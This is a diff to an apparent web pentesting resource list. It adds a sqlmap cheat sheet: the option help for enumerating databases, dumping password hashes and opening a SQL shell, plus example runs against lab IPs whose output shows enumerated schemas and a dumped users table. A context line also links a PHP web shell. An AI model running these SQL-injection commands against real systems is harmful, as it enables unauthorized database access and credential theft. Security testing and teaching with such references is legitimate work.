@@ -17,6 +17,136 @@
 * [OWASP Web Application Security Testing Checklist](https://github.com/0xRadi/OWASP-Web-Checklist)
 * [phpbash](https://github.com/Arrexel/phpbash) - A semi-interactive PHP shell compressed into a single file
 
+### Cheat Sheets
+
+#### sqlmap
+
+```
+Target:
+  At least one of these options has to be provided to define the
+  target(s)
+
+  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+
+Request:
+  These options can be used to specify how to connect to the target URL
+  
+  -A AGENT            HTTP User-Agent header value
+  -H HEADER           Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+  -X METHOD           Force usage of given HTTP method (e.g. PUT)
+  --data=DATA         Data string to be sent through POST (e.g. "id=1")
+  --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+  
+Enumeration:
+  These options can be used to enumerate the back-end database
+  management system information, structure and data contained in the
+  tables
+  
+  -a, --all           Retrieve everything
+  --current-user      Retrieve DBMS current user
+  --current-db        Retrieve DBMS current database
+  --hostname          Retrieve DBMS server hostname
+  --is-dba            Detect if the DBMS current user is DBA
+  --users             Enumerate DBMS users
+  --passwords         Enumerate DBMS users password hashes
+  --privileges        Enumerate DBMS users privileges
+  --roles             Enumerate DBMS users roles
+  --dbs               Enumerate DBMS databases
+  --tables            Enumerate DBMS database tables
+  --columns           Enumerate DBMS database table columns
+  --schema            Enumerate DBMS schema
+  --count             Retrieve number of entries for table(s)
+  --dump              Dump DBMS database table entries
+  --dump-all          Dump entries of all DBMS database tables
+  --search            Search column(s), table(s) and/or database name(s)
+  -D DB               DBMS database to enumerate
+  -T TBL              DBMS database table(s) to enumerate
+  -C COL              DBMS database table column(s) to enumerate
+  --exclude=EXCLUDE   DBMS database identifier(s) to not enumerate
+  -U USER             DBMS user to enumerate
+  --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+  --sql-query=SQLQ..  SQL statement to be executed
+  --sql-shell         Prompt for an interactive SQL shell
+    
+Brute force:
+  These options can be used to run brute force checks
+  
+  --common-tables     Check existence of common tables
+  --common-columns    Check existence of common columns
+  --common-files      Check existence of common files
+```
+
+```
+// Enumerate database management system schema
+$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
+
+[...]
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+| username    | text    |
++-------------+---------+
+
+Database: owasp10
+Table: blogs_table
+[4 columns]
++--------------+----------+
+| Column       | Type     |
++--------------+----------+
+| date         | datetime |
+| blogger_name | text     |
+| cid          | int(11)  |
+| comment      | text     |
++--------------+----------+
+
+Database: owasp10
+Table: hitlog
+[6 columns]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| date     | datetime |
+| browser  | text     |
+| cid      | int(11)  |
+| hostname | text     |
+| ip       | text     |
+| referer  | text     |
++----------+----------+
+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+[...]
+
+// Dump database table entries
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
+[...]
+Database: Firebird_masterdb
+Table: USERS
+[4 entries]
++----+--------+------------+
+| ID | NAME   | SURNAME    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+```
+
 ### Tools
 
 #### JSON Web Tokens
